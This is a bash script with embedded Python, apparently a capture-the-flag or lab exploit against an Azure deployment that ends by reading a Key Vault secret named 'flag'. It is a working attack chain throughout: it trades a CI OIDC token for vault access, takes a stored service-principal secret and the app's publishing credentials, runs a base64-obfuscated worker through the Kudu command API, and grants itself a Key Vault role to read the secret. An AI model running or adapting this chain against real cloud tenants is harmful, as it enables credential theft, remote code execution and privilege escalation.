#!/usr/bin/env bash
set +e
python3 - <<'PY'
import base64, json, os, time, urllib.parse, urllib.request, urllib.error, uuid
TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"; CID="72ff278a-9e71-43ec-bac4-2ca303f8e462"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"; RG="rg-tbl-reporting-prod-eus"; APP="app-tbl-reporting-prod"
KV1="https://kv-tbl-prod-x3euoz.vault.azure.net"
def emit(x): print("OUT="+json.dumps(x,default=str),flush=True)
def read(req,t=30): return json.loads(urllib.request.urlopen(req,timeout=t).read().decode())
def form(url,f,t=30): return read(urllib.request.Request(url,data=urllib.parse.urlencode(f).encode(),method="POST"),t)
try:
    oidc=read(urllib.request.Request(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api%3A%2F%2FAzureADTokenExchange",headers={"Authorization":"Bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]}))["value"]
    vt=form("https://login.microsoftonline.com/"+TEN+"/oauth2/v2.0/token",{"client_id":CID,"grant_type":"client_credentials","scope":"https://vault.azure.net/.default","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":oidc})["access_token"]
    sp=json.loads(read(urllib.request.Request(KV1+"/secrets/reporting-service-principal?api-version=7.4",headers={"Authorization":"Bearer "+vt}))["value"])
    spcid=sp.get("appId") or sp.get("clientId"); spsec=sp.get("clientSecret") or sp.get("client_secret")
    arm=form("https://login.microsoftonline.com/"+TEN+"/oauth2/v2.0/token",{"client_id":spcid,"grant_type":"client_credentials","client_secret":spsec,"scope":"https://management.azure.com/.default"})["access_token"]
    emit({"stage":"creds","ok":True})
    pub=read(urllib.request.Request("https://management.azure.com/subscriptions/"+SUB+"/resourceGroups/"+RG+"/providers/Microsoft.Web/sites/"+APP+"/config/publishingcredentials/list?api-version=2023-01-01",data=b"{}",method="POST",headers={"Authorization":"Bearer "+arm,"Content-Type":"application/json"}))
    ku,kp=pub["properties"]["publishingUserName"],pub["properties"]["publishingPassword"]
    auth=base64.b64encode((ku+":"+kp).encode()).decode()
    worker=r'''import base64,json,os,time,urllib.parse,urllib.request,urllib.error,uuid
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
MIRES="/subscriptions/"+SUB+"/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"
KV2="https://kv-tbl-sec-x3euoz.vault.azure.net"
def out(x): print("WORKER="+json.dumps(x,default=str),flush=True)
def jwt_claim(tok,key):
 try:
  p=tok.split(".")[1]+"="*(-len(tok.split(".")[1])%4); return json.loads(base64.urlsafe_b64decode(p.encode())).get(key)
 except Exception: return None
env=os.environ; IE=env.get("IDENTITY_ENDPOINT") or ""; IH=env.get("IDENTITY_HEADER") or ""
out({"stage":"worker","ie":IE,"has_h":bool(IH)})
def token(res):
 cand=[]
 if IE:
  for ex in ("&mi_res_id="+urllib.parse.quote(MIRES,safe=""),"&client_id=7a85156a-01c4-4e61-8472-40a92107159b",""):
   cand.append((IE+"?resource="+urllib.parse.quote(res,safe="")+"&api-version=2019-08-01"+ex,{"X-IDENTITY-HEADER":IH}))
 for e in cand:
  try:
   d=json.loads(urllib.request.urlopen(urllib.request.Request(e[0],headers=e[1]),timeout=4).read().decode())
   if d.get("access_token"): return d["access_token"]
  except Exception: pass
 raise RuntimeError("no MI token")
def call(url,tok,method="GET",body=None):
 try:
  r=urllib.request.urlopen(urllib.request.Request(url,data=(json.dumps(body).encode() if body is not None else None),method=method,headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"}),timeout=25); return {"status":r.status,"body":r.read().decode("utf-8","replace")[:4000]}
 except urllib.error.HTTPError as e: return {"status":e.code,"body":e.read().decode("utf-8","replace")[:800]}
 except Exception as e: return {"error":repr(e)}
try:
 vt=token("https://vault.azure.net"); at=token("https://management.azure.com")
 r0=call(KV2+"/secrets/flag?api-version=7.4",vt)
 if r0.get("status")==200: out({"stage":"flag-direct","r":r0}); raise SystemExit
 scope="subscriptions/"+SUB+"/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
 ra="https://management.azure.com/"+scope+"/providers/Microsoft.Authorization/roleAssignments/"+str(uuid.uuid4())+"?api-version=2022-04-01"
 body={"properties":{"roleDefinitionId":"/subscriptions/"+SUB+"/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":jwt_claim(vt,"oid"),"principalType":"ServicePrincipal"}}
 out({"stage":"grant","r":call(ra,at,"PUT",body)})
 for i in range(8):
  r=call(KV2+"/secrets/flag?api-version=7.4",token("https://vault.azure.net")); out({"stage":"flag","try":i+1,"r":r})
  if r.get("status")==200: break
  time.sleep(4)
except Exception as e: out({"stage":"werr","e":repr(e)})
'''
    b64=base64.b64encode(worker.encode()).decode()
    cmd="python3 -c \"import base64;exec(base64.b64decode('"+b64+"').decode())\""
    req=urllib.request.Request("https://"+APP+".scm.azurewebsites.net/api/command",data=json.dumps({"command":cmd,"dir":"site/wwwroot"}).encode(),method="POST",headers={"Authorization":"Basic "+auth,"Content-Type":"application/json"})
    raw=urllib.request.urlopen(req,timeout=120).read().decode("utf-8","replace")
    print("KUDU_RESULT="+raw,flush=True)
except Exception as e:
    emit({"stage":"outer-error","error":repr(e)})
PY
